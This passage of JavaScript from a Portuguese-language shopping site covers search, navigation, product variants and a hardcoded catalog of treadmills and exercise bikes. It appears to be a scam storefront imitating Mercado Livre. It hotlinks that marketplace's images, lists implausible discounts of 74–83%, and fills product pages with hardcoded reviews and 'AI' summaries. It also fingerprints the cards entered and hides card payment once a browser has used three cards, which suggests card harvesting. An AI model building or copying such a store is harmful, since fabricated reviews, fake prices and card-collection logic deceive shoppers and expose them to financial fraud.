    suggest.classList.toggle('is-open', hits.length > 0);
    qField.setAttribute('aria-expanded', String(hits.length > 0));
    qField.removeAttribute('aria-activedescendant');
  }

  function moveSuggestion(delta) {
    const items = $$('li', suggest);
    if (!items.length) return;
    sugIndex = (sugIndex + delta + items.length) % items.length;
    items.forEach((li, i) => {
      const on = i === sugIndex;
      li.classList.toggle('is-active', on);
      li.setAttribute('aria-selected', String(on));
    });
    qField.setAttribute('aria-activedescendant', items[sugIndex].id);
  }

  qField.addEventListener('input', renderSuggestions);
  qField.addEventListener('keydown', e => {
    if (!suggest.classList.contains('is-open')) return;
    if (e.key === 'ArrowDown') { e.preventDefault(); moveSuggestion(1); }
    else if (e.key === 'ArrowUp') { e.preventDefault(); moveSuggestion(-1); }
    else if (e.key === 'Enter' && sugIndex >= 0) {
      e.preventDefault();
      qField.value = $$('li', suggest)[sugIndex].textContent.trim();
      closeAllMenus();
    }
  });
  suggest.addEventListener('mousedown', e => {
    const li = e.target.closest('li');
    if (!li) return;
    e.preventDefault();
    qField.value = li.textContent.trim();
    closeAllMenus();
    toast(`Busca: “${qField.value}” — demonstração, não navega para outra página.`);
  });
  qField.addEventListener('blur', () => setTimeout(closeAllMenus, 120));

  $('#searchForm').addEventListener('submit', e => {
    e.preventDefault();
    const term = qField.value.trim();
    closeAllMenus();
    toast(term ? `Busca: “${term}” — demonstração.` : 'Digite algo para buscar.');
  });

  /* ==================== NAVEGAÇÃO INTERNA (SPA) ==================== */
  document.addEventListener('click', e => {
    const link = e.target.closest('a[href^="#"]');
    if (!link || link.dataset.noscroll !== undefined) return;
    e.preventDefault();
    const id = link.getAttribute('href').slice(1);
    const target = id ? document.getElementById(id) : null;
    if (target) {
      target.scrollIntoView({ block: 'start' });
      if (!target.hasAttribute('tabindex')) target.setAttribute('tabindex', '-1');
      target.focus({ preventScroll: true });
    } else {
      window.scrollTo({ top: 0 });
    }
  });

  /* ---------- estado inicial ---------- */
  setQty(1);

  // Se o navegador já bateu o limite de 3 cartões numa visita anterior,
  // já abre o checkout sem a opção de cartão.
  if (_getCardFps().length >= CARD_LIMIT) disableCardOption();

  /* ============================ VARIANTES (Cor / Voltagem / Potência) ============================ */
  function rebuildThumbs() {
    thumbsEl.innerHTML = activeGallery.map((g, i) => `
      <button class="thumb${i === 0 ? ' is-active' : ''}" type="button" data-i="${i}"
              aria-current="${i === 0}" aria-label="Ver imagem ${i + 1} de ${activeGallery.length}">
        <img src="${g.thumb}" width="112" height="112" decoding="async" alt="">
        ${g.type === 'video' ? `<span class="thumb__play">${icon('i-play')}</span>` : ''}
      </button>`).join('');
    $$('.thumb', thumbsEl).forEach(btn => {
      const go = () => setGallery(Number(btn.dataset.i));
      btn.addEventListener('mouseenter', go);
      btn.addEventListener('click', go);
      btn.addEventListener('focus', go);
    });
    setGallery(0);
  }

  [
    {
      optsId: 'varVoltOpts', labelId: 'varVoltLabel',
      onSelect: label => {
        activeGallery = COLOR_GALLERIES[label] || GALLERY;
        rebuildThumbs();
      }
    },
    { optsId: 'varPotOpts',  labelId: 'varPotLabel'  }
  ].forEach(({ optsId, labelId, onSelect }) => {
    const opts    = $('#' + optsId);
    const labelEl = $('#' + labelId);
    if (!opts || !labelEl) return;
    opts.addEventListener('click', e => {
      const btn = e.target.closest('.var-btn');
      if (!btn) return;
      $$('.var-btn', opts).forEach(b => { b.classList.remove('is-sel'); b.setAttribute('aria-pressed', 'false'); });
      btn.classList.add('is-sel');
      btn.setAttribute('aria-pressed', 'true');
      labelEl.textContent = btn.dataset.label;
      if (onSelect) onSelect(btn.dataset.label);
    });
  });

  /* ============================ CATÁLOGO — páginas de produto por ?id= ============================ */
  const _CP = 'assets/products/';
  const PRODUCTS = {
    19: { name: 'Esteira Elétrica Dream Fitness Ergométrica Bivolt Ginástica DR2110 Preto', img: 'https://http2.mlstatic.com/D_NQ_NP_762973-MLA102379176322_122025-O.webp', p: '199,20', old: '1.200,00', off: '83% OFF', vars: null,
      specs: [['Marca', 'Dream Fitness'], ['Modelo', 'DR2110'], ['Potência', '1600 W'], ['Velocidade máx.', '12 km/h'], ['Carga máxima', '130 kg'], ['Voltagem', 'Bivolt (127/220V)'], ['Dobrável', 'Sim'], ['Uso indicado', 'Doméstico']],
      desc: 'Esteira elétrica Dream Fitness DR2110, bivolt e dobrável. Motor de 1600 W, velocidade de 0,8 a 12 km/h, suporte de até 130 kg e display digital. Design compacto que dobra para fácil armazenamento em casa.',
      reviewMeta: { count: '507', ai: 'Boa esteira para uso doméstico e caminhadas. Motor robusto, aguenta bem o peso. Suporte de braço um pouco curto, mas no geral é silenciosa e funcional para o dia a dia.' },
      reviews: [
        { rate: 4, name: 'Marcos V.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 480, likes: 57,
          text: 'Estou ha 2 semanas com a esteira e peso 117 kls muito boa ! aguenta mesmo e muito forte ! rangidos normais de esteira ja perdi 6kls com esse brinquedinho jejum intermitente das 18 as 7 ! nao me arrependo da compra nao uso 30 minutos de manha em jejum e a noite em jejum !!.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_606657-MLA88364324617_072025-O.webp') ] },
        { rate: 4, name: 'Cristiane B.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 460, likes: 45,
          text: 'Para uso doméstico o aparelho atende as necessidades, uso só para caminhar. Tenho 75 kg e sinto ela um pouco instável quando usada em alta velocidade. Na utilização sinto que ela tem um aquecimento acima do normal, mas até agora está funcionando — estou usando a mais ou menos um mês.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_743236-MLA83038939070_032025-O.webp') ] },
        { rate: 4, name: 'Roberta F.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 455, likes: 45,
          text: 'Esteira muito boa e eficiente só estranhei um pouco o barulho mas cumpre com o desejado.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_635390-MLA92969517727_092025-O.webp') ] },
        { rate: 4, name: 'Sandra M.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 440, likes: 38,
          text: 'Está atendendo muito bem minhas expectativas. Não a comprei para correr, somente para caminhadas, porém meu filho já a usou para correr e não teve problemas. Faz barulhos normais de uma esteira. É só colocar uma música que resolve este problema. O painel é simples e para mim também é indiferente. Só não atribuo cinco estrelas pelo fato do suporte ser muito curto. Em resumo, estou muito feliz com minha aquisição.',
          media: [
            _ri('https://http2.mlstatic.com/D_NQ_NP_2X_630305-MLA92317589687_092025-O.webp'),
            _ri('https://http2.mlstatic.com/D_NQ_NP_2X_905670-MLA99045245576_112025-O.webp')
          ] },
        { rate: 5, name: 'Letícia A.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 420, likes: 24,
          text: 'Até agora sem muitos problemas. Achei que ela faz o barulho normal que toda esteira faz, nada absurdo. Desliza muito bem. Achei o apoio de braço um pouco curto, tenho 1,65 e se eu quiser segurar firme no apoio fico com as costas curvas. Fora isso não tenho o que reclamar até o momento.' }
      ] },
    20: { name: 'Esteira Elétrica Dream Fitness Ergométrica Ginástica Energy 2.1 Preto',
      img: 'https://http2.mlstatic.com/D_NQ_NP_671064-MLA99847152475_112025-O.webp',
      p: '168,00', old: '890,00', off: '81% OFF', vars: null,
      specs: [['Marca', 'Dream Fitness'], ['Modelo', 'Energy 2.1'], ['Potência', '1500 W'], ['Velocidade máx.', '10 km/h'], ['Carga máxima', '120 kg'], ['Voltagem', 'Bivolt (127/220V)'], ['Dobrável', 'Sim'], ['Uso indicado', 'Doméstico']],
      desc: 'Esteira elétrica Dream Fitness Energy 2.1, bivolt e dobrável. Ideal para caminhadas e exercícios leves em casa. Motor silencioso com display digital mostrando velocidade, tempo e calorias. Design compacto e dobrável para facilitar o armazenamento.',
      reviewMeta: { count: '77', ai: 'Esteira compacta e fácil de montar. Ótima para caminhadas em casa. Design dobrável e prático facilita guardar. Boa escolha para quem quer se exercitar sem sair de casa.' },
      reviews: [
        { rate: 5, name: 'Ana P.', country: 'Brasil', when: 'Há 2 meses', ageDays: 60, likes: 5,
          text: 'Fácil de montar. Supriu minhas expectativas.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_817467-MLA113877369907_062026-B.jpg'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_686331-MLA113877132545_062026-O.webp') ] },
        { rate: 4, name: 'Fernanda R.', country: 'Brasil', when: 'Há 8 meses', ageDays: 240, likes: 5,
          text: 'Produto de ótima qualidade e funciona exatamente como esperado.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_869266-MLA101269222834_122025-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_896553-MLA101269162946_122025-O.webp') ] },
        { rate: 5, name: 'Juliana C.', country: 'Brasil', when: 'Há 3 meses', ageDays: 90, likes: 4,
          text: 'Aparelho muito bom.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_816068-MLA112338887005_052026-B.jpg'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_754167-MLA111303099364_052026-O.webp') ] },
        { rate: 5, name: 'Carla M.', country: 'Brasil', when: 'Há 5 meses', ageDays: 150, likes: 4,
          text: 'Ótima pra exercícios.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_755330-MLA108300914296_032026-O.webp') ] },
        { rate: 5, name: 'Renata S.', country: 'Brasil', when: 'Há 10 meses', ageDays: 300, likes: 4,
          text: 'Muito estou gostando muito prática e bonita.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_886268-MLA96312021597_102025-O.webp') ] }
      ] },
    21: { name: 'Esteira Elétrica Dream Fitness Energy 1600 Dobrável Ergométrica Preto',
      img: 'https://http2.mlstatic.com/D_NQ_NP_735261-MLA99524005004_122025-O.webp',
      p: '144,00', old: '690,00', off: '79% OFF', vars: null,
      specs: [['Marca', 'Dream Fitness'], ['Modelo', 'Energy 1600'], ['Potência', '1600 W'], ['Velocidade máx.', '10 km/h'], ['Carga máxima', '110 kg'], ['Voltagem', 'Bivolt (127/220V)'], ['Dobrável', 'Sim'], ['Uso indicado', 'Doméstico']],
      desc: 'Esteira elétrica Dream Fitness Energy 1600, bivolt e dobrável. Leve e compacta, ideal para espaços pequenos. Display digital com velocidade, tempo e calorias. Indicada para caminhadas e uso doméstico leve.',
      reviewMeta: { count: '663', ai: 'Esteira pequena e leve, ideal para mulheres e espaços reduzidos. Fácil de montar e usar. Boa para caminhada em casa. Produto com bom custo-benefício para exercício diário.' },
      reviews: [
        { rate: 4, name: 'Sônia L.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 450, likes: 119,
          text: 'Dentro da minha necessidade, fiquei contemplada. Veio semi montada. Consegui montá-la rapidamente. Está funcionando perfeitamente, com visor básico que mostra velocidade, tempo e calorias. É pequena e dobrável. Serve ao meu propósito.' },
        { rate: 5, name: 'Rodrigo A.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 440, likes: 97,
          text: 'Excelente produto pelo preço pago. Mais muito pequena tanto pra largura quanto para comprimento. Excelente para mulher de pequeno porte.' },
        { rate: 5, name: 'Márcia B.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 430, likes: 33,
          text: 'Bom, parece lenta mas gostei. Pra fazer exercícios em casa tá ótimo. Só achei que viria o lugar e desliga normal em cima. Não gostei desse trem de chave de segurança não. Mas tá ótimo. Recomendo.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_731658-MLA73160136998_122023-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_935320-MLA73160117682_122023-O.webp') ] },
        { rate: 4, name: 'Paulo H.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 420, likes: 32,
          text: 'Produto bom! Serve bastante pra a minha mãe.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_774256-MLA72877111424_112023-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_731987-MLA72877111422_112023-O.webp') ] },
        { rate: 5, name: 'Tatiana V.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 410, likes: 14,
          text: 'Gostei, meu marido achou um pouco pequena, mas para mim que nunca usei uma esteira, ela está perfeita.' }
      ] },
    22: { name: 'Estação De Musculação Com 80kg Aparelho Ginástica Cinza/Preto',
      img: 'https://http2.mlstatic.com/D_NQ_NP_862122-MLA109741238527_032026-O.webp',
      p: '168,00', old: '780,00', off: '78% OFF', vars: null,
      specs: [['Marca', 'Ginastic'], ['Peso dos anilhas', '80 kg'], ['Estrutura', 'Aço reforçado'], ['Estofamento', 'Preto'], ['Carga máxima', '100 kg'], ['Exercícios', 'Pulley, peck deck, leg press e mais'], ['Montagem', 'Manual incluído'], ['Uso indicado', 'Doméstico']],
      desc: 'Estação de musculação com 80 kg de anilhas, ideal para treino completo em casa. Estrutura em aço com estofamento confortável. Permite realizar pulley, peck deck, rosca scott, leg press e outros exercícios sem precisar ir à academia.',
      reviewMeta: { count: '2.654', ai: 'Estação resistente e com boa variedade de exercícios. Montagem demorada mas vale o resultado. Material de qualidade. Ideal para quem quer treinar em casa sem frequentar academia.' },
      reviews: [
        { rate: 5, name: 'Diego F.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 450, likes: 420,
          text: 'Estação muito boa, qualidade ótima e sem barulhos, peças bem justas sem nenhuma folga, sistema de cabos passando perfeitamente pelas polias. Da para fazer muitos exercícios basta pesquisar. Tenho 1,80 e 70kg e a estação com certeza vai mudar muito bem minha forma física. Recomendo demais!' },
        { rate: 4, name: 'Andréa C.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 440, likes: 291,
          text: 'Produto de ótima qualidade, fácil montagem e bem resistente. Fiquei com medo do peso ser pouco mas garanto que não é. Para as pessoas altas a estação poderia ser uns 15 a 20 cm mais alta. Para as baixas é perfeita. Recomendo!' },
        { rate: 5, name: 'Lúcia R.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 435, likes: 200,
          text: 'Está me atendendo muito bem, não gosto de ir a academia e está sendo uma ótima solução. Consigo fazer um treino completo com ela. Recomendo o produto!',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_901493-MLA72840649493_112023-O.webp') ] },
        { rate: 4, name: 'Gustavo T.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 430, likes: 182,
          text: 'Produto de boa qualidade, custo benefício vale a pena, fácil de montar. O único ponto negativo é que ao usar carga mais alta nos exercícios o equipamento tende a balançar para trás, mas pode ser resolvido colocando um peso na base.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_744491-MLA73553674262_122023-O.webp') ] },
        { rate: 5, name: 'Beatriz M.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 420, likes: 111,
          text: 'Muito satisfeito! Está atendendo muito bem. Material de qualidade. Manual super intuitivo. Montagem foi uma terapia.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_992040-MLA74421284642_022024-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_620131-MLA74421284640_022024-O.webp') ] }
      ] },
    23: { name: 'Esteira Elétrica Ergométrica Keepvital 12km/h 127/220v Preto',
      img: 'https://http2.mlstatic.com/D_NQ_NP_966355-MLB116216627878_092026-O-esteira-eletrica-ergometrica-keepvital-12kmh-127220v-preto.webp',
      p: '128,00', old: '680,00', off: '81% OFF', vars: null,
      specs: [['Marca', 'Keepvital'], ['Velocidade máx.', '12 km/h'], ['Conectividade', 'Bluetooth'], ['Console', 'Removível e espaçoso'], ['Voltagem', 'Bivolt (127/220V)'], ['Cor', 'Preto'], ['Uso indicado', 'Doméstico'], ['Recursos', 'Bluetooth para música']],
      desc: 'Esteira elétrica Keepvital bivolt com velocidade máxima de 12 km/h. Bandeja do console removível com espaço para celular, tablet e livros. Conectividade Bluetooth para reproduzir música durante o treino. Design compacto para uso doméstico.',
      reviewMeta: { count: '7', ai: 'Esteira com console espaçoso e Bluetooth para música. Boa para caminhada e exercícios em casa. Produto novo com ótimo custo-benefício.' },
      reviews: [
        { rate: 5, name: 'Cláudia N.', country: 'Brasil', when: 'Há 4 semanas', ageDays: 28, likes: 0,
          text: 'Gosto muito desta esteira; a bandeja do console é removível e tão espaçosa quanto mostram as imagens, sendo capaz de acomodar celular, tablet e livros. Ela também conta com conectividade bluetooth para reproduzir música, o que é extremamente prático para mim.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_694918-MLA115040803292_082026-B.jpg'), _ri('https://http2.mlstatic.com/D_NQ_NP_950793-MLA117137683721_092026-B.jpg') ] },
        { rate: 5, name: 'Roberto P.', country: 'Brasil', when: 'Há 3 dias', ageDays: 3, likes: 0,
          text: 'Muito bom!!' },
        { rate: 5, name: 'Simone A.', country: 'Brasil', when: 'Há 3 dias', ageDays: 3, likes: 0,
          text: 'Excelente equipamento, amei.' },
        { rate: 5, name: 'Marcos L.', country: 'Brasil', when: 'Há 1 semana', ageDays: 7, likes: 0,
          text: 'Muito bom, funcionando perfeitamente desde que chegou. Recomendo!' },
        { rate: 5, name: 'Vanessa O.', country: 'Brasil', when: 'Há 2 semanas', ageDays: 14, likes: 0,
          text: 'Produto chegou bem embalado e na data prevista. Funcionando ótimo. Ótima compra!' }
      ] },
    24: { name: 'Bicicleta Spinning Com Roda De Inércia De 13kg Wct Fitness Original Cor Preto Preto/Amarelo',
      img: 'https://http2.mlstatic.com/D_NQ_NP_874975-MLA103430021763_012026-O.webp',
      p: '152,00', old: '800,00', off: '81% OFF', vars: null,
      specs: [['Marca', 'WCT Fitness'], ['Roda de inércia', '13 kg'], ['Carga máxima', '150 kg'], ['Regulagem', 'Selim e guidão ajustáveis'], ['Resistência', 'Por fricção'], ['Cor', 'Preto/Amarelo'], ['Uso indicado', 'Doméstico e semiprofissional'], ['Pedal', 'Com encaixe para sapatilha']],
      desc: 'Bicicleta spinning WCT Fitness com roda de inércia de 13 kg para treinos intensos em casa. Suporta até 150 kg, selim e guidão totalmente ajustáveis. Resistência por fricção para simular diferentes inclinações. Ideal para cardio e emagrecimento.',
      reviewMeta: { count: '18.909', ai: 'Bicicleta resistente e estável, aguenta bem pesos altos. Fácil de montar sem manual. Silenciosa no uso e ótima para quem está emagrecendo. Custo-benefício excelente.' },
      reviews: [
        { rate: 5, name: 'Wellington S.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 500, likes: 1234,
          text: 'Maravilhosa, tenho 140kg estou em processo de emagrecimento, fiquei receoso por conta do meu peso, mas ela não faz um barulho, não estrala nada, muito forte e resistente. Nem usei manual para montar.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_918181-MLA75944659694_052024-O.webp') ] },
        { rate: 5, name: 'Priscila M.', country: 'Brasil', when: 'Há 1 ano', ageDays: 365, likes: 1101,
          text: 'Recomendo este produto. Gostei muito da bike, não ocupa muito espaço, fácil de montar, design lindo, e tem me ajudado muito no processo de emagrecimento! Faço cardio todos os dias, pelo menos uma hora por dia, e lá se foram 16kg. Recomendo!!!',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_864380-MLA80384535129_112024-O.webp') ] },
        { rate: 5, name: 'Thiago N.', country: 'Brasil', when: 'Há 1 ano', ageDays: 360, likes: 808,
          text: 'A bicicleta é muito boa (desde que bem apertados os parafusos), não faz nenhum barulho de fato, fácil de adaptar a altura e peso. Tenho 1,60m e 68kg e meu esposo 1,80m e 98kg e nós dois usamos de forma muito confortável. A bicicleta aguenta super bem sem tremelicar e se mantendo muito estável.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_824464-MLA79527804594_102024-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_981414-MLA79527960394_102024-O.webp') ] },
        { rate: 5, name: 'Elaine B.', country: 'Brasil', when: 'Há 1 ano', ageDays: 355, likes: 727,
          text: 'Era meu sonho ter uma bicicleta. Simplesmente perfeita, sem defeitos. Maravilhosa. Quem estiver pesquisando e com receio pode comprar sem medo, vocês não irão se arrepender. Além de linda, é muito resistente.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_762606-MLA81124826650_122024-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_932571-MLA81392490513_122024-O.webp') ] },
        { rate: 5, name: 'Isabela C.', country: 'Brasil', when: 'Há 1 ano', ageDays: 350, likes: 323,
          text: 'Muito satisfeita com a minha escolha, pesquisei muito antes de comprar. E se mostrou uma ótima escolha. Recomendo, é melhor do que muitas de academia que se vê por aí, um aparelho profissional de verdade.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_910440-MLA80309514522_112024-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_907416-MLA80309797084_112024-O.webp') ] }
      ] },
    25: { name: 'Bicicleta Spinning Romantic Crown Preto Roda Inércia 13kg',
      img: 'https://http2.mlstatic.com/D_NQ_NP_888363-MLA112174121516_062026-O.webp',
      p: '96,00', old: '490,00', off: '80% OFF', vars: null,
      specs: [['Marca', 'Romantic Crown'], ['Roda de inércia', '13 kg'], ['Cor', 'Preto'], ['Regulagem', 'Selim e guidão ajustáveis'], ['Resistência', 'Por fricção'], ['Carga máxima', '120 kg'], ['Uso indicado', 'Doméstico'], ['Design', 'Compacto']],
      desc: 'Bicicleta spinning Romantic Crown com roda de inércia de 13 kg. Selim e guidão ajustáveis para diferentes estaturas. Resistência por fricção para variar a intensidade do treino. Design compacto e elegante na cor preta para uso doméstico.',
      reviewMeta: { count: '1.579', ai: 'Bicicleta bonita e funcional. Boa para iniciantes e treinos regulares em casa. Algumas peças precisam de ajuste, mas no geral cumpre bem o prometido. Ótimo custo-benefício.' },
      reviews: [
        { rate: 4, name: 'Fernanda K.', country: 'Brasil', when: 'Há 1 ano', ageDays: 370, likes: 72,
          text: 'É boa e bonita, mas tem uns pontos negativos. Dependendo do peso que coloque na roda de inércia ela faz um barulho chato. O banco na regulagem de distância não fica na posição mais curta com firmeza. No geral ela é ótima.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_908859-MLA87251671384_072025-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_616012-MLA87251769106_072025-O.webp') ] },
        { rate: 5, name: 'Camila P.', country: 'Brasil', when: 'Há 2 meses', ageDays: 60, likes: 65,
          text: 'Adorei o produto, entrega rápida e chegou tudo bem embalado. Achei fácil de montar, seguindo o manual junto com o meu esposo.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_790402-MLA114601165005_072026-B.jpg'), _ri('https://http2.mlstatic.com/D_NQ_NP_688273-MLA114600990971_072026-B.jpg') ] },
        { rate: 5, name: 'Claudinei R.', country: 'Brasil', when: 'Há 1 ano', ageDays: 380, likes: 48,
          text: 'Gostei demais, tenho mais de 150 kg e 1,75m de altura. Confesso que nos primeiros dias foi muito desafiador, a perna doía e a bunda também, mas depois de 1 semana começa a ficar menos doloroso. Atualmente com mais de 1 mês de uso, não tenho dificuldade nenhuma. Recomendo demais.' },
        { rate: 5, name: 'Patrícia N.', country: 'Brasil', when: 'Há 1 ano', ageDays: 360, likes: 40,
          text: 'Ela é perfeita!!!! Boa qualidade de material, ótima pra fazer cardio em casa. Super recomendo para quem quer começar a se exercitar sem sair de casa.',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_843509-MLA108811326488_032026-O.webp') ] },
        { rate: 5, name: 'Luciana T.', country: 'Brasil', when: 'Há 5 meses', ageDays: 150, likes: 41,
          text: 'Ótimo produto! Serve tanto pra mim que sou baixinha 1,55 e para meu esposo que tem 1,83. O banco achei mais confortável que outros. Inclusive foi a IA que me ajudou a escolher, ela estava entre a melhor opção. Nota 10!',
          media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_2X_843509-MLA108811326488_032026-O.webp'), _ri('https://http2.mlstatic.com/D_NQ_NP_2X_750041-MLA108811356154_032026-O.webp') ] }
      ] },
    26: { name: 'Esteira Elétrica 6km/h Dobrável Com Controle Remoto Display LED',
      img: 'https://http2.mlstatic.com/D_NQ_NP_922066-MLA117642490037_092026-O.webp',
      p: '99,00', old: '380,00', off: '74% OFF', vars: null,
      specs: [['Velocidade máxima', '6 km/h'], ['Dobrável', 'Sim'], ['Controle remoto', 'Incluso'], ['Display', 'LED'], ['Uso indicado', 'Residencial'], ['Tipo', 'Ergométrica'], ['Voltagem', 'Bivolt'], ['Peso suportado', '100 kg']],
      desc: 'Esteira elétrica dobrável com velocidade de até 6km/h, controle remoto incluso e display LED. Design compacto para caminhada e corrida leve em casa. Fácil de dobrar e guardar, ideal para quem busca comodidade sem abrir mão da qualidade.',
      reviewMeta: { count: '739', ai: 'Esteira excelente para uso doméstico com ótimo custo-benefício. Compacta, silenciosa e fácil de montar. Inclui controle remoto e app. Perfeita para caminhada e corridas leves em casa.' },
      reviews: [
        { rate: 5, name: 'Mariana L.', country: 'Brasil', when: 'Há 1 mês', ageDays: 30, likes: 134,
          text: 'Esteira top! Vale muito o custo benefício. Silenciosa, montagem rápida e o controle remoto é prático demais. Uso todo dia para caminhar meia hora e já perdi 3kg. Recomendo!' },
        { rate: 5, name: 'Thiago A.', country: 'Brasil', when: 'Há 2 meses', ageDays: 55, likes: 123,
          text: 'Nota 10. Produto excelente, superou minhas expectativas. Chegou rápido e bem embalado. O display é bem visível e o app é simples de usar.' },
        { rate: 5, name: 'Carolina V.', country: 'Brasil', when: 'Há 1 mês', ageDays: 28, likes: 71,
          text: '10/10, a qualidade me surpreendeu, muito, muito melhor do que eu esperava, vem com controle e app. Tem inclinação, varios modos de corrida…aprovadissima. Pela leveza e praticidade também é 10000!!!.' },
        { rate: 5, name: 'Roberto S.', country: 'Brasil', when: 'Há 2 meses', ageDays: 60, likes: 25,
          text: 'Esteira muito boa e o preço bem barato e chega rápido.' },
        { rate: 5, name: 'Priscila M.', country: 'Brasil', when: 'Há 3 meses', ageDays: 90, likes: 20,
          text: 'Ótima para caminhar em casa. Silenciosa, não acorda ninguém. O aplicativo é bem simples de usar. Perfeita para quem está começando.' }
      ] },
    28: { name: 'Mini Bicicleta Ergométrica Bike Pedalinho WCT Fitness',
      img: 'https://http2.mlstatic.com/D_NQ_NP_864090-MLA95668516334_102025-O.webp',
      p: '48,00', old: '110,00', off: '56% OFF', vars: null,
      specs: [['Tipo', 'Pedalinho ergométrico'], ['Uso indicado', 'Doméstico'], ['Resistência', 'Ajustável'], ['Display', 'Digital'], ['Cor', 'Preto/Cinza'], ['Marca', 'WCT Fitness'], ['Peso suportado', '100 kg'], ['Dobrável', 'Não']],
      desc: 'Mini bicicleta ergométrica pedalinho WCT Fitness para exercitar pernas e braços sem sair do lugar. Resistência ajustável, display digital com contador de tempo, distância e calorias. Compacta e leve, ideal para uso em casa, escritório ou enquanto assiste TV.',
      reviewMeta: { count: '2.341', ai: 'Ótimo para exercitar pernas em casa ou no escritório. Resistência ajustável e display simples. Produto leve e de fácil manuseio. Custo-benefício excelente para quem quer se manter ativo.' },
      reviews: [
        { rate: 5, name: 'Claudia R.', country: 'Brasil', when: 'Há 2 meses', ageDays: 60, likes: 87,
          text: 'Adoro usar enquanto assisto TV. Faz diferença no dia a dia. Compacto, fácil de guardar e a resistência funciona bem. Super recomendo!' },
        { rate: 5, name: 'Eduardo M.', country: 'Brasil', when: 'Há 1 mês', ageDays: 35, likes: 54,
          text: 'Produto de qualidade. Uso no escritório embaixo da mesa. Ajuda muito a manter o movimento mesmo trabalhando. Entrega rápida.' },
        { rate: 4, name: 'Isabela F.', country: 'Brasil', when: 'Há 3 meses', ageDays: 90, likes: 32,
          text: 'Bom custo-benefício. O display é simples mas funciona. Resistência ajustável é um diferencial. Indico para quem quer algo prático.' }
      ] },
    29: { name: 'Bicicleta Spinning Redfin X11 Roda de Inércia 6kg Display LCD',
      img: 'https://http2.mlstatic.com/D_NQ_NP_816113-MLA104275900297_012026-O.webp',
      p: '79,00', old: '380,00', off: '79% OFF', vars: null,
      specs: [['Roda de inércia', '6 kg'], ['Display', 'LCD'], ['Resistência', 'Por fricção'], ['Selim', 'Ajustável'], ['Guidão', 'Ajustável'], ['Peso suportado', '110 kg'], ['Cor', 'Preto/Vermelho'], ['Marca', 'Redfin']],
      desc: 'Bicicleta spinning Redfin X11 com roda de inércia de 6 kg e display LCD para acompanhar velocidade, tempo, distância e calorias. Selim e guidão ajustáveis para diferentes estaturas. Resistência por fricção para variar a intensidade do treino. Ideal para cardio em casa.',
      reviewMeta: { count: '812', ai: 'Boa opção para quem está começando no spinning. Estável e silenciosa para uso doméstico. Fácil montagem e boa qualidade de acabamento para o preço.' },
      reviews: [
        { rate: 5, name: 'Roberta S.', country: 'Brasil', when: 'Há 2 meses', ageDays: 55, likes: 76,
          text: 'Estou adorando! Monto o treino em casa mesmo, já emagreci 4kg em 6 semanas. Produto sólido e estável. Chegou bem embalado e fácil de montar.' },
        { rate: 5, name: 'Marcelo A.', country: 'Brasil', when: 'Há 1 mês', ageDays: 30, likes: 41,
          text: 'Ótima bicicleta pelo preço. Estável, silenciosa e o display é simples de usar. Recomendo para quem quer treinar em casa.' },
        { rate: 4, name: 'Fernanda K.', country: 'Brasil', when: 'Há 3 meses', ageDays: 95, likes: 28,
          text: 'Produto bom, montagem tranquila. A resistência funciona bem. Só acho o selim um pouco duro, mas é fácil de trocar.' }
      ] },
    30: { name: 'Bicicleta Ergométrica Spinning Profissional Inércia 15kg App',
      img: 'https://http2.mlstatic.com/D_NQ_NP_939834-MLA116308309017_082026-O.webp',
      p: '78,00', old: '380,00', off: '79% OFF', vars: null,
